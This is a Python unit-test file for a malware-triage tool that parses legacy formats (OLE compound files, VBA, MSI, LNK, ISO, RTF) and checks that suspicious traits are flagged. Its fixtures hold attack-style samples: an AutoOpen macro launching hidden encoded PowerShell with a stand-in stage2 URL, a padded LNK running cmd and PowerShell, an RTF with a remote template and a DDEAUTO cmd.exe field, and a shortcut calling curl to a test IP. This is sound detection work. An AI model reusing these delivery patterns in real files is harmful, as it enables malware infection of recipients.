"""Phase 6: compound files, VBA, MSI, LNK, ISO 9660 and RTF.

Real fixtures: ``genisoimage-joliet.iso.gz`` (genisoimage 1.1.11, Joliet) and
``xlwt-workbook.xls`` (xlwt 1.3.0). Compound files and shortcuts built by
``tests/builders.py`` were cross-checked with olefile 0.47 and pylnk3 0.4.
"""

import gzip
import struct
import unittest
import zipfile
from io import BytesIO
from pathlib import Path

from garbage_intel.modules import legacy_formats as lf
from garbage_intel.modules.file_intel import analyze_bytes, detect_format

from tests import builders

FIXTURES = Path(__file__).parent / "fixtures"
MACRO = (
    'Sub AutoOpen()\r\n'
    '  Set shell = CreateObject("WScript.Shell")\r\n'
    '  shell.Run "powershell -w hidden -enc SQBFAFgA"\r\n'
    '  url = "http://payload.example.net/stage2"\r\n'
    'End Sub\r\n'
)


def word_document(macro=MACRO):
    streams = {
        "WordDocument": b"\xec\xa5" + b"\0" * 5000,
        "1Table": b"\0" * 300,
        "\x05SummaryInformation": builders.summary_information(
            {2: "Quarterly report", 4: "Analyst", 8: "Editor", 12: 133_400_000_000_000_000, 18: "Microsoft Office Word"}
        ),
    }
    for path, data in builders.vba_project({"NewMacros": macro, "ThisDocument": 'Attribute VB_Name = "ThisDocument"\r\n'}).items():
        streams[f"Macros/{path}"] = data
    return builders.compound_file(streams)


def ole1(class_name, native):
    name = class_name.encode() + b"\0"
    return struct.pack("<III", 0x0501, 2, len(name)) + name + struct.pack("<III", 0, 0, len(native)) + native


def hexed(raw):
    text = raw.hex().encode()
    return b"\n".join(text[index : index + 64] for index in range(0, len(text), 64))


class CompressionTests(unittest.TestCase):
    def test_spec_example_and_round_trip(self):
        # [MS-OVBA] 3.2.3 example: literals mixed with copy tokens.
        compressed = bytes.fromhex(
            "012FB000236161616263646582660070616768696A013808616B6C00306D6E6F70"
            "06710270041072737475761077787 97A003C".replace(" ", "")
        )
        self.assertEqual(lf.ovba_decompress(compressed), b"#aaabcdefaaaaghijaaaaaklaaamnopqaaaaaaaaaaaarstuvwxyzaaa")
        text = bytes(range(32, 127)) * 100  # two raw 4 KiB chunks and a compressed tail
        self.assertEqual(lf.ovba_decompress(builders.ovba_compress_literal(text)), text)
        for bad in (b"", b"\x02abc", b"\x01\x05\xb0\x01\xff\xff"):
            with self.assertRaises(lf.FormatError):
                lf.ovba_decompress(bad)


class CompoundFileTests(unittest.TestCase):
    def test_word_document_with_macros(self):
        result = lf.analyse_compound(word_document())
        self.assertEqual(result["kind"], "doc")
        self.assertEqual(result["summary"]["title"], "Quarterly report")
        self.assertEqual(result["summary"]["created"], "2023-09-24T03:33:20Z")
        project = result["vba"][0]
        self.assertEqual(project["storage"], "Macros/VBA")
        module = next(item for item in project["modules"] if item["name"] == "NewMacros")
        self.assertIn('CreateObject("WScript.Shell")', module["source"])
        self.assertEqual(module["autoexec"], ["AutoOpen"])
        self.assertEqual(set(module["suspicious"]), {"process", "objects", "network", "scripting"})

    def test_real_excel_workbook(self):
        data = (FIXTURES / "xlwt-workbook.xls").read_bytes()
        result = lf.analyse_compound(data)
        self.assertEqual(result["kind"], "xls")
        self.assertEqual([item["path"] for item in result["streams"]], ["Workbook"])
        self.assertEqual(result["vba"], [])

    def test_msi_tables_and_summary(self):
        data = builders.compound_file(
            {
                builders.msi_name("_Tables"): b"\0" * 40,
                builders.msi_name("CustomAction"): b"\0" * 20,
                builders.msi_name("Binary.helper", table=False): b"MZ" + b"\0" * 5000,
                "\x05SummaryInformation": builders.summary_information(
                    {3: "Fixture Product", 4: "Fixture Vendor", 7: "Intel;1033", 9: "{11111111-2222-3333-4444-555555555555}"}
                ),
            },
            root_clsid="000c1084-0000-0000-c000-000000000046",
        )
        result = lf.analyse_compound(data)
        self.assertEqual(result["kind"], "msi")
        self.assertEqual(result["msi_tables"], ["CustomAction", "_Tables"])
        self.assertTrue(result["msi_custom_actions"])
        self.assertEqual(result["msi_binary_streams"], 1)
        self.assertEqual(result["summary"]["manufacturer"], "Fixture Vendor")
        self.assertEqual(result["summary"]["package_code"], "{11111111-2222-3333-4444-555555555555}")

    def test_malformed_compound_files_do_not_crash(self):
        good = word_document()
        for data in (good[:600], good[:512] + b"\xff" * 2048, good[:30] + b"\x0c\x00" + good[32:]):
            try:
                lf.analyse_compound(data)
            except (lf.FormatError, struct.error):
                pass
        looped = bytearray(good)
        fat_sector = struct.unpack_from("<I", good, 76)[0]
        offset = (fat_sector + 1) * 512
        struct.pack_into("<I", looped, offset, 0)  # sector 0 points at itself
        try:
            lf.analyse_compound(bytes(looped))
        except (lf.FormatError, struct.error):
            pass


class ShortcutTests(unittest.TestCase):
    def test_shortcut_fields_and_heuristics(self):
        data = builders.shell_link(
            "C:\\Windows\\System32\\cmd.exe",
            " " * 120 + "/c powershell -w hidden -enc SQBFAFgA",
            working_dir="%TEMP%",
            icon="C:\\Windows\\System32\\shell32.dll",
        )
        result = lf.analyse_lnk(data)
        self.assertEqual(result["local_base_path"], "C:\\Windows\\System32\\cmd.exe")
        self.assertEqual(result["working_dir"], "%TEMP%")
        self.assertEqual(result["show_command"], "minimized")
        self.assertEqual(result["volume"], {"drive_type": "fixed", "serial": "1234ABCD", "label": "DATA"})
        self.assertEqual(result["machine_id"], "ws-fixture")
        self.assertEqual(result["droid_mac"], "00:50:56:9a:1b:2c")
        self.assertTrue(result["padded_arguments"])
        self.assertIn("powershell", result["risky_command"])
        self.assertIn("cmd.exe /c", result["risky_command"])
        with self.assertRaises(lf.FormatError):
            lf.analyse_lnk(b"L\0\0\0" + b"\0" * 100)
        lf.analyse_lnk(data[:120])  # truncated string data is reported, not raised


class IsoTests(unittest.TestCase):
    def test_real_joliet_image(self):
        data = gzip.decompress((FIXTURES / "genisoimage-joliet.iso.gz").read_bytes())
        result = lf.analyse_iso(data)
        self.assertEqual(result["volume_id"], "GARBAGE_FX")
        self.assertEqual(result["publisher"], "Garbage Tests")
        self.assertTrue(result["joliet"])
        self.assertEqual(
            [item["path"] for item in result["entries"]],
            ["README.TXT", "docs/", "docs/invoice.pdf.exe", "docs/report.lnk"],
        )
        self.assertEqual(result["risky_entries"], ["docs/invoice.pdf.exe", "docs/report.lnk"])
        self.assertEqual(lf.detect_legacy(data), "iso")


class RtfTests(unittest.TestCase):
    def test_objects_templates_and_fields(self):
        package = b"\x02\x00invoice.pdf.exe\0C:\\Users\\a\\Desktop\\invoice.pdf.exe\0\0\0\x03\0MZ...."
        equation = builders.compound_file({"Equation Native": b"\x1c\0" + b"A" * 60})
        data = (
            b"{\\rtf1\\ansi{\\*\\template http://203.0.113.9/t.dotm}"
            b"{\\field{\\*\\fldinst { HYPERLINK \"https://example.org/doc\" }}{\\fldrslt link}}"
            b"{\\field{\\*\\fldinst DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc\"}}"
            b"{\\object\\objemb\\objupdate{\\*\\objclass Package}{\\*\\objdata " + hexed(ole1("Package", package)) + b"}}"
            b"{\\object\\objemb{\\*\\objclass Equation.3}{\\*\\objdata 01050000\\par " + hexed(ole1("Equation.3", equation))[8:] + b"}}}"
        )
        result = lf.analyse_rtf(data)
        self.assertEqual(result["object_count"], 2)
        self.assertEqual(result["objects"][0]["package_label"], "invoice.pdf.exe")
        self.assertEqual(result["objects"][1]["class_name"], "Equation.3")
        self.assertEqual(result["objects"][1]["embedded_ole"]["streams"], ["Equation Native"])
        self.assertTrue(result["equation_editor"])
        self.assertTrue(result["auto_update_objects"])
        self.assertEqual(result["remote_templates"], ["http://203.0.113.9/t.dotm"])
        self.assertEqual([field["type"] for field in result["fields"]], ["HYPERLINK", "DDEAUTO"])


class FileIntelligenceIntegrationTests(unittest.TestCase):
    def test_detection(self):
        self.assertEqual(detect_format(word_document())["id"], "doc")
        self.assertEqual(detect_format(b"{\\rtf1 hello}")["id"], "rtf")
        self.assertEqual(detect_format(builders.shell_link("C:\\a.exe", "x"))["id"], "lnk")

    def test_word_document_findings_and_macro_indicators(self):
        analysis = analyze_bytes(word_document(), "report.doc")
        codes = {item["code"] for item in analysis["findings"]}
        self.assertTrue({"vba-macros", "vba-autoexec", "vba-suspicious-keywords"} <= codes)
        self.assertIn("http://payload.example.net/stage2", {item["value"] for item in analysis["indicators"]})
        self.assertEqual(analysis["metadata"]["document_properties"]["author"], "Analyst")
        self.assertNotIn("extension-mismatch", codes)

    def test_rtf_named_doc_is_flagged(self):
        analysis = analyze_bytes(b"{\\rtf1{\\object{\\*\\objclass Equation.3}}}", "invoice.doc")
        codes = {item["code"] for item in analysis["findings"]}
        self.assertTrue({"extension-mismatch", "rtf-equation-editor", "rtf-objects"} <= codes)

    def test_docm_vba_project_is_read_in_memory(self):
        project = builders.compound_file(builders.vba_project({"Module1": MACRO}))
        buffer = BytesIO()
        with zipfile.ZipFile(buffer, "w") as archive:
            archive.writestr("[Content_Types].xml", "<Types/>")
            archive.writestr("word/document.xml", "<document/>")
            archive.writestr("word/vbaProject.bin", project)
        analysis = analyze_bytes(buffer.getvalue(), "letter.docm")
        self.assertEqual(analysis["structure"]["vba"][0]["storage"], "word/vbaProject.bin:VBA")
        self.assertIn("vba-autoexec", {item["code"] for item in analysis["findings"]})

    def test_shortcut_and_iso_findings(self):
        shortcut = analyze_bytes(builders.shell_link("C:\\Windows\\System32\\cmd.exe", "/c curl http://203.0.113.5/a"), "invoice.pdf.lnk")
        self.assertIn("lnk-command", {item["code"] for item in shortcut["findings"]})
        self.assertIn("http://203.0.113.5/a", {item["value"] for item in shortcut["indicators"]})
        image = analyze_bytes(gzip.decompress((FIXTURES / "genisoimage-joliet.iso.gz").read_bytes()), "docs.iso")
        self.assertEqual(image["format"], "iso")
        self.assertIn("iso-executable-content", {item["code"] for item in image["findings"]})
        self.assertEqual(image["structure"]["entry_count"], 4)


if __name__ == "__main__":
    unittest.main()
